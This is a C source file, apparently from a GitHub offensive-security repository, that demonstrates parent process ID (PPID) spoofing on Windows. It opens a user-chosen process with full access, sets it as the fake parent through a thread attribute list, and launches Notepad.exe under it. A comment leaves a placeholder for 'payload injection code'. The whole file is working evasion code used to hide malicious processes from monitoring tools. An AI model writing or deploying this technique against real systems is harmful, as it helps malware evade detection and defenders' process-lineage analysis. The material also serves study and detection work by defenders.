/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Notes : this code aims to demonstrate how to spoof PPID & updating it.
 */

#include <stdio.h>
#include <windows.h>

#pragma warning (disable:4996)

#define TARGET_PROCESS "Notepad.exe"

/// @brief Creating a new process spoofing a dedicated parent process ID. (PPID spoofing.)
/// @param hParent 
/// @param lpProcessName 
/// @param dwProcessId 
/// @param hProcess 
/// @param hThread 
/// @return TRUE if function succeed.
BOOL CreatePPidSpoofedProcess(IN HANDLE hParent, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT PHANDLE hProcess, OUT PHANDLE hThread){
    CHAR lpPath     [MAX_PATH * 2];
    CHAR WinDir     [MAX_PATH];
    CHAR CurrentDir	[MAX_PATH];

    SIZE_T                      sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    STARTUPINFOEXA              siEx           = {0};
    PROCESS_INFORMATION         Pi             = {0};

    RtlSecureZeroMemory(&siEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA); //setting size of struct.

    if(!GetEnvironmentVariableA("WINDIR", WinDir, MAX_PATH)){
        printf("[!] Failing to retrieve environment variable... \n");
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WinDir, lpProcessName);
	sprintf(CurrentDir, "%s\\System32\\", WinDir);

    //----------------DEEPING INTO SPOOF TECHNIQUE----------------------
    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList); //fail & return sizeof to be later allocated in 2th call.

    //alloc mem
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if(pThreadAttList == NULL){
        printf("[!] HeapAlloc failed with error : %d\n", GetLastError());
        return FALSE;
    }

    //2th call.
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    // created using `UpdateProcThreadAttribute` - that is the parent process
    siEx.lpAttributeList = pThreadAttList;

    //------------Creating process step-------------------------

    printf("[*] Creating new process...\n");
    if(!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        CurrentDir,
        &siEx.StartupInfo,
        &Pi
    )){
        printf("\n[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
    }

    printf("[+] DONE \n");

    //getting new process informations.
    *dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

/// @brief testing function.
/// @param argc 
/// @param argv 
/// @return EXIT_SUCCESS | EXIT_FAILURE
int main(int argc, char *argv[]){
    if(argc != 2){
        printf("[!] Missing \"Parent Process Id\" Argument \n");
		return -1;
    }

    DWORD		dwPPid			= atoi(argv[1]),
				dwProcessId		= NULL;

	HANDLE		hPProcess		= NULL,
				hProcess		= NULL,
				hThread			= NULL;

    if ((hPProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPPid)) == NULL) {
		printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());
		return EXIT_FAILURE;
	}

    printf("[i] Spawning Target Process \"%s\" With Parent : %d \n", TARGET_PROCESS, dwPPid);
	if (!CreatePPidSpoofedProcess(hPProcess, TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return EXIT_FAILURE;
	}
	printf("[i] Target Process Created With Pid : %d \n", dwProcessId);

    /*
	
		payload injection code here.
	
	*/

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

    return EXIT_SUCCESS;
}